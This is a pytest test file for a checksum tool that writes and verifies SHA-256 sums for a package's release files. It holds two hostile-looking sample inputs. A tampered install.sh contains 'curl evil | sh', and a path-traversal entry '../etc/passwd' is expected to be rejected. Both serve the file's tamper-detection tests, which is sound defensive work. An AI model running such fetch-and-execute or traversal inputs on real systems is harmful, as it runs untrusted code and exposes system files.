import hashlib
import shutil
import subprocess
from pathlib import Path

import pytest
from checksums import SUMS_NAME, ChecksumError, main, parse, verify, write


@pytest.fixture
def dist(tmp_path: Path) -> Path:
    d = tmp_path / "dist"
    d.mkdir()
    (d / "sombra-0.2.0-py3-none-any.whl").write_bytes(b"wheel bytes")
    (d / "sombra-0.2.0.tar.gz").write_bytes(b"sdist bytes")
    (d / "install.sh").write_text("#!/bin/sh\n")
    return d


def test_write_lists_every_asset_sorted_in_sha256sum_format(dist: Path) -> None:
    text = write(dist).read_text()
    expected = hashlib.sha256(b"wheel bytes").hexdigest()
    assert text.splitlines() == [
        f"{hashlib.sha256(b'#!/bin/sh\n').hexdigest()}  install.sh",
        f"{expected}  sombra-0.2.0-py3-none-any.whl",
        f"{hashlib.sha256(b'sdist bytes').hexdigest()}  sombra-0.2.0.tar.gz",
    ]


def test_rewriting_does_not_hash_the_sums_file(dist: Path) -> None:
    write(dist)
    assert SUMS_NAME not in write(dist).read_text()


def test_verify_accepts_what_write_produced(dist: Path) -> None:
    write(dist)
    assert verify(dist) == ["install.sh", "sombra-0.2.0-py3-none-any.whl", "sombra-0.2.0.tar.gz"]


@pytest.mark.parametrize("tool", [["sha256sum", "-c"], ["shasum", "-a", "256", "-c"]])
def test_stock_tools_accept_the_file(dist: Path, tool: list[str]) -> None:
    if shutil.which(tool[0]) is None:
        pytest.skip(f"{tool[0]} not installed")
    write(dist)
    subprocess.run([*tool, SUMS_NAME], cwd=dist, check=True, capture_output=True)  # noqa: S603


def test_verify_reports_tampered_missing_and_unlisted_files(dist: Path) -> None:
    write(dist)
    (dist / "install.sh").write_text("#!/bin/sh\ncurl evil | sh\n")
    (dist / "sombra-0.2.0.tar.gz").unlink()
    (dist / "extra.txt").write_text("x")
    with pytest.raises(ChecksumError) as exc:
        verify(dist)
    msg = str(exc.value)
    assert "install.sh: checksum mismatch" in msg
    assert "sombra-0.2.0.tar.gz: missing" in msg
    assert "extra.txt: not listed" in msg


def test_verify_can_ignore_unlisted_files(dist: Path) -> None:
    write(dist)
    (dist / "notes.md").write_text("x")
    assert "notes.md" not in verify(dist, require_all=False)


def test_verify_without_sums_file(dist: Path) -> None:
    with pytest.raises(ChecksumError, match="not found"):
        verify(dist)


def test_write_refuses_an_empty_directory(tmp_path: Path) -> None:
    with pytest.raises(ChecksumError, match="no files"):
        write(tmp_path)


def test_parse_accepts_binary_mode_and_blank_lines() -> None:
    digest = "A" * 64
    assert parse(f"\n{digest} *file.whl\n") == {"file.whl": "a" * 64}


@pytest.mark.parametrize(
    ("text", "match"),
    [
        ("", "empty"),
        ("abc  file\n", "malformed"),
        ("f" * 64 + "\n", "malformed"),
        ("f" * 64 + "  ../etc/passwd\n", "path"),
        ("f" * 64 + "  a\n" + "e" * 64 + "  a\n", "twice"),
    ],
)
def test_parse_rejects_bad_files(text: str, match: str) -> None:
    with pytest.raises(ChecksumError, match=match):
        parse(text)


def test_cli(dist: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert main(["write", str(dist)]) == 0
    assert "install.sh" in capsys.readouterr().out
    assert main(["verify", str(dist)]) == 0
    assert "install.sh: OK" in capsys.readouterr().out
    (dist / "install.sh").write_text("changed")
    assert main(["verify", str(dist)]) == 1
    assert "checksum mismatch" in capsys.readouterr().err
